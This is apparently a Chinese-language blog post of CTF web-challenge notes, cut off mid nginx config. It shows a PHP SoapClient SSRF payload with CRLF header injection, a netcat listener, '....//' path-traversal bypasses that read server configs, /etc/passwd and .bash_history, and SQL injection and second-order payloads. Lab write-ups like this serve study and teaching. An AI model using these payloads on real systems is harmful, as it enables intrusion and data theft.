{"title":"CTF_web_wp","uid":"df0d3403c0b3873dd87fee8ad4e5e9ae","slug":"CTF-web-wp","date":"2023-08-01T09:22:05.000Z","updated":"2024-02-29T08:43:09.535Z","comments":true,"path":"api/articles/CTF-web-wp.json","keywords":null,"cover":"/medias/pexels-luis-gomes-546819.jpg","content":"<h1 id=\"比赛经验\"><a href=\"#比赛经验\" class=\"headerlink\" title=\"比赛经验\"></a>比赛经验</h1><p><img src=\"/../CTF-web-wp/image-20230801180103741.png\" alt=\"image-20230801180103741\"></p>\n<h1 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h1><ol>\n<li>服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)</li>\n<li>攻击者能够利用目标帮助攻击者访问其他想要攻击的目标</li>\n<li>攻击者要求服务器为他访问URL</li>\n<li>可用于内网访问</li>\n</ol>\n<h4 id=\"netstate\"><a href=\"#netstate\" class=\"headerlink\" title=\"netstate\"></a>netstate</h4><p><a href=\"https://zhuanlan.zhihu.com/p/397058259\">https://zhuanlan.zhihu.com/p/397058259</a></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">.<span class=\"token punctuation\">\\</span>nc64.exe <span class=\"token parameter variable\">-lvp</span> <span class=\"token number\">9999</span>\n\n监听9999端口\n-l： 开启监听\n-p：指定端口\n-t： 以telnet形式应答\n-e：程序重定向\n-n：以数字形式表示ip\n-v：显示执行命令过程\n<span class=\"token parameter variable\">-z</span> <span class=\"token builtin class-name\">:</span> 不进行交互，直接显示结果\n<span class=\"token parameter variable\">-u</span> ：使用UDP协议传输\n<span class=\"token parameter variable\">-w</span> <span class=\"token builtin class-name\">:</span> 设置超时时间<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"本地测试\"><a href=\"#本地测试\" class=\"headerlink\" title=\"本地测试\"></a>本地测试</h4><div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<ul>\n<li><p><strong>SoapClient::__construct</strong>(?string $wsdl, array $options &#x3D; []) ,SoapClient类，</p>\n</li>\n<li><p>第二个参数中 uri指nameSpacelocation </p>\n</li>\n<li><p>location：The URL of the SOAP server to send the request to.\n</div>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$ua</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$client</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"http://127.0.0.1:9999\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$client</span><span class=\"token operator\">-></span><span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//调用不存在的方法，会自动调用——call()函数来发送请求</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><strong>调用不存在的方法，会自动调用__call()函数来发送请求</strong>，因此才可以监听到</p>\n</li>\n<li><p>监听到的信息如下:</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/2.png\" alt=\"cd0b8b184445e0e036680bec91acf90.png\"></p>\n<ul>\n<li><p>这里可以看到User-Agent是可以注入的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$ua</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ctfshow\\r\\nx-forwarded-for:127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$client</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"http://127.0.0.1/flag.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token variable\">$ua</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$client</span><span class=\"token operator\">-></span><span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//调用不存在的方法，会自动调用——call()函数来发送请求</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<p><strong>知识点：</strong></p>\n</li>\n<li><p>windows中使用\\r\\n表示换行</p>\n</div>\n</li>\n<li><p>监听到的信息如下：</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/3.png\" alt=\"fde4feaec606bbc57e1f81c5673c513.png\"></p>\n<ul>\n<li>因为Content-length是13，所以到标记2处就已经结束了，后面的包服务器会忽略</li>\n</ul>\n<h4 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h4><p><img src=\"/../CTF-web-wp/4.png\" alt=\"image.png\"><br><img src=\"/../CTF-web-wp/5.png\" alt=\"image.png\"></p>\n<ul>\n<li>由于这里不存在getFlag()方法，且需要访问flag.php，直接访问flag.php的结果如下：</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/6.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>这就需要用ssrf内网访问</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$ua</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ctfshow\\r\\nx-forwarded-for:127.0.0.1,1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$client</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"http://127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token variable\">$ua</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// $client->getFlag();  //调用不存在的方法，会自动调用__call()函数来发送请求</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$client</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>在反序列化后，会访问127.0.0.1&#x2F;flag.php，此时因为vip-&gt;getFlag()不存在，所以会用__call()函数来发送请求</p>\n</li>\n<li><p>因此在我构造好的$client中就已经满足了flag.php的要求，会将flag写入flag.txt中</p>\n</li>\n<li><p>直接访问flag.txt就可以获得flag</p>\n</li>\n</ul>\n<h1 id=\"做题思路\"><a href=\"#做题思路\" class=\"headerlink\" title=\"做题思路\"></a>做题思路</h1><p><img src=\"/../CTF-web-wp/7.png\"></p>\n<h2 id=\"提醒自己\"><a href=\"#提醒自己\" class=\"headerlink\" title=\"提醒自己\"></a>提醒自己</h2><ul>\n<li>耐心的看函数源码，查关键字如<code>flag、admin、user</code>等</li>\n<li>耐心的看给出的函数，这里一定有可以用的</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/8.png\" alt=\"image.png\"></p>\n<h2 id=\"存在目录穿越\"><a href=\"#存在目录穿越\" class=\"headerlink\" title=\"存在目录穿越\"></a>存在目录穿越</h2><p>假设目录是<code>post.wtf?post=aaaaa</code></p>\n<ol>\n<li>直接用<code>post=aaaaa../</code>测试</li>\n<li>去掉post后参数用<code>post=../</code>测试</li>\n<li><code>../</code>被过滤了用<code>....//</code>测试</li>\n</ol>\n<h2 id=\"有提示的地方\"><a href=\"#有提示的地方\" class=\"headerlink\" title=\"有提示的地方\"></a>有提示的地方</h2><p><code>console</code>、查看源码、Git上找项目名称</p>\n<h2 id=\"linux的关键目录\"><a href=\"#linux的关键目录\" class=\"headerlink\" title=\"linux的关键目录\"></a>linux的关键目录</h2><ul>\n<li>如果<code>/etc/passwd</code>中有<code>/bin/bash</code></li>\n<li>访问<code>/home/www/.bash_history</code>可以看到执行过的历史命令</li>\n</ul>\n<h2 id=\"语言或者框架\"><a href=\"#语言或者框架\" class=\"headerlink\" title=\"语言或者框架\"></a>语言或者框架</h2><h3 id=\"pl\"><a href=\"#pl\" class=\"headerlink\" title=\".pl\"></a>.pl</h3><ul>\n<li>找它的关键特征，如后缀，版本号</li>\n<li>结合具体给出的信息，在网上找相关的漏洞</li>\n<li>如给出后缀是<code>.pl</code>，存在文件上传界面，查<code>perl的文件上传</code></li>\n</ul>\n<h3 id=\"JSESSIONID\"><a href=\"#JSESSIONID\" class=\"headerlink\" title=\"JSESSIONID\"></a>JSESSIONID</h3><ul>\n<li>java框架，加载<code>struct2</code>的相关目录</li>\n</ul>\n<h2 id=\"fuzz测试\"><a href=\"#fuzz测试\" class=\"headerlink\" title=\"fuzz测试\"></a>fuzz测试</h2><h2 id=\"存在文件包含，可以查看源码\"><a href=\"#存在文件包含，可以查看源码\" class=\"headerlink\" title=\"存在文件包含，可以查看源码\"></a>存在文件包含，可以查看源码</h2><h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p><img src=\"/../CTF-web-wp/9.png\" alt=\"image.png\"></p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p><img src=\"/../CTF-web-wp/10.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里显然也是文件包含，根据提示是需要读取<code>/etc/nginx/sites-enabled/site.conf</code></li>\n</ul>\n<p><strong>测试1：</strong></p>\n<ul>\n<li>首先在file处填<code>/etc/nginx/sites-enabled/site</code>，在ext处填<code>conf</code></li>\n<li>发现不行</li>\n</ul>\n<p><strong>测试2：</strong></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">file</span><span class=\"token operator\">=</span>/etc/nginx/sites-enabled/site.conf<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">conf</span><span class=\"token operator\">=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>发现不行</li>\n</ul>\n<p><strong>测试3：</strong></p>\n<ul>\n<li><p>测试目录穿越，最多测试5个<code>../</code>,这里发现<code>../</code>被禁了</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">file</span><span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/<span class=\"token punctuation\">..</span>/<span class=\"token punctuation\">..</span>/<span class=\"token punctuation\">..</span>/etc/nginx/sites-enabled/site.conf<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">conf</span><span class=\"token operator\">=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong>测试4：</strong></p>\n</li>\n<li><p>用<code>....//</code>代替<code>../</code>,成功显示源码</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token assign-left variable\">file</span><span class=\"token operator\">=</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//etc/nginx/sites-enabled/site.conf<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">conf</span><span class=\"token operator\">=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"找到可以交互的地方\"><a href=\"#找到可以交互的地方\" class=\"headerlink\" title=\"找到可以交互的地方\"></a>找到可以交互的地方</h2><ul>\n<li>有可能出现在包的cookie处</li>\n<li>404页面处</li>\n<li>一切地方，<strong>总之仔细看包</strong></li>\n</ul>\n<h2 id=\"sql注入题\"><a href=\"#sql注入题\" class=\"headerlink\" title=\"sql注入题\"></a>sql注入题</h2><h3 id=\"解题步骤\"><a href=\"#解题步骤\" class=\"headerlink\" title=\"解题步骤\"></a>解题步骤</h3><ul>\n<li>一般是有一个<code>register.php</code>和一个<code>login.php</code></li>\n<li>正常注册账号密码，登录进去</li>\n</ul>\n<h4 id=\"找注入点\"><a href=\"#找注入点\" class=\"headerlink\" title=\"找注入点\"></a>找注入点</h4><div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">提示</p>\n<ol>\n<li>一切我输入的东西，之后显示出来了，都说明存在交互，也就是都可能存在注入</li>\n<li>如果没有回显，可能需要盲注</li>\n</ol>\n\n</div>\n<h4 id=\"注入点是登陆之后的信息\"><a href=\"#注入点是登陆之后的信息\" class=\"headerlink\" title=\"注入点是登陆之后的信息\"></a>注入点是登陆之后的信息</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><strong>攻防世界 难度5 unfinish</strong></p></blockquote>\n<ul>\n<li>在注册界面是输入<code>email、username、password</code></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/11.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里发现输入只需要输入<code>email、password</code></li>\n</ul>\n<p><img src=\"/../CTF-web-wp/12.png\" alt=\"image.png\"></p>\n<ul>\n<li>登录之后，发现显示了用户名，所有交互的界面，只有这里</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/13.png\" alt=\"image.png\"></p>\n<ul>\n<li>所有可能在username处存在注入</li>\n</ul>\n<h4 id=\"测试可用的字符\"><a href=\"#测试可用的字符\" class=\"headerlink\" title=\"测试可用的字符\"></a>测试可用的字符</h4><ol>\n<li>首先测试的时候要多试，到底过滤了没，比如遇到过如果注册成功包返回302，没成功返回200的。要用Burp试、hackbar试、登录框试</li>\n</ol>\n<ul>\n<li>fuzz测试可用的字符</li>\n</ul>\n<h4 id=\"命令闭合\"><a href=\"#命令闭合\" class=\"headerlink\" title=\"命令闭合\"></a>命令闭合</h4><h5 id=\"insert-语句\"><a href=\"#insert-语句\" class=\"headerlink\" title=\"insert 语句\"></a>insert 语句</h5><ul>\n<li><p>比如注册时候填的信息是被insert到数据库中的</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">values</span><span class=\"token punctuation\">(</span><span class=\"token string\">'$username'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'$password'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>就可以用Mysql的运算闭合</p>\n</li>\n<li><p>输入</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">0</span><span class=\"token string\">'+select hex(database())+'</span><span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>之后就可以用<code>ascii + substr</code>爆破具体的信息</p>\n</li>\n</ul>\n<h3 id=\"addslashes\"><a href=\"#addslashes\" class=\"headerlink\" title=\"addslashes\"></a>addslashes</h3><ul>\n<li>addslashes后，在存入数据库时，并不会加入反斜杠，也就是你写啥就存啥</li>\n<li>但是当你从数据库中再取出来用的时候，这时候我之前构造的sql语句就会执行</li>\n<li><strong>所以重点关注addslashes后，什么从数据库中取出来了</strong></li>\n</ul>\n<h2 id=\"文件上传题\"><a href=\"#文件上传题\" class=\"headerlink\" title=\"文件上传题\"></a>文件上传题</h2><ul>\n<li>攻防世界 filemanager</li>\n</ul>\n<h2 id=\"nginx\"><a href=\"#nginx\" class=\"headerlink\" title=\"nginx\"></a>nginx</h2><p><a href=\"https://zhuanlan.zhihu.com/p/579768206\">Nginx配置中root和alias分不清？本文３分钟帮你解惑！</a></p>\n<pre class=\"line-numbers language-nginx\" data-language=\"nginx\"><code class=\"language-nginx\"><span class=\"token directive\"><span class=\"token keyword\">server</span></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">listen</span> <span class=\"token number\">8080</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">## listen for ipv4; this line is default and implied</span>\n    <span class=\"token directive\"><span class=\"token keyword\">listen</span> [::]:8080</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">## listen for ipv6</span>\n\n    <span class=\"token directive\"><span class=\"token keyword\">root</span> /var/www/html</span><span class=\"token punctuation\">;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">index</span> index.php index.html index.htm</span><span class=\"token punctuation\">;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">port_in_redirect</span> <span class=\"token boolean\">off</span></span><span class=\"token punctuation\">;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">server_name</span> _</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\"># Make site accessible from http://localhost/</span>\n    <span class=\"token comment\">#server_name localhost;</span>\n\n    <span class=\"token comment\"># If block for setting the time for the logfile</span>\n    <span class=\"token directive\"><span class=\"token keyword\">if</span> (<span class=\"token variable\">$time_iso8601</span> ~ <span class=\"token string\">\"^(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)\"</span>)</span> <span class=\"token punctuation\">&#123;</span>\n       <span class=\"token directive\"><span class=\"token keyword\">set</span> <span class=\"token variable\">$year</span> <span class=\"token variable\">$1</span></span><span class=\"token punctuation\">;</span>\n       <span class=\"token directive\"><span class=\"token keyword\">set</span> <span class=\"token variable\">$month</span> <span class=\"token variable\">$2</span></span><span class=\"token punctuation\">;</span>\n       <span class=\"token directive\"><span class=\"token keyword\">set</span> <span class=\"token variable\">$day</span> <span class=\"token variable\">$3</span></span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\"># Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html</span>\n    <span class=\"token directive\"><span class=\"token keyword\">sendfile</span> <span class=\"token boolean\">off</span></span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token directive\"><span class=\"token keyword\">set</span> <span class=\"token variable\">$http_x_forwarded_for_filt</span> <span class=\"token variable\">$http_x_forwarded_for</span></span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">if</span> (<span class=\"token variable\">$http_x_forwarded_for_filt</span> ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token directive\"><span class=\"token keyword\">set</span> <span class=\"token variable\">$http_x_forwarded_for_filt</span> <span class=\"token variable\">$1</span>???</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\"># Add stdout logging</span>\n\n    <span class=\"token directive\"><span class=\"token keyword\">access_log</span> /var/log/nginx/<span class=\"token variable\">$hostname</span>-access-<span class=\"token variable\">$year</span>-<span class=\"token variable\">$month</span>-<span class=\"token variable\">$day</span>.log openshift_log</span><span class=\"token punctuation\">;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">error_log</span> /var/log/nginx/error.log info</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token directive\"><span class=\"token keyword\">location</span> /</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\"># First attempt to serve request as file, then</span>\n        <span class=\"token comment\"># as directory, then fall back to index.html</span>\n        <span class=\"token directive\"><span class=\"token keyword\">try_files</span> <span class=\"token variable\">$uri</span> <span class=\"token 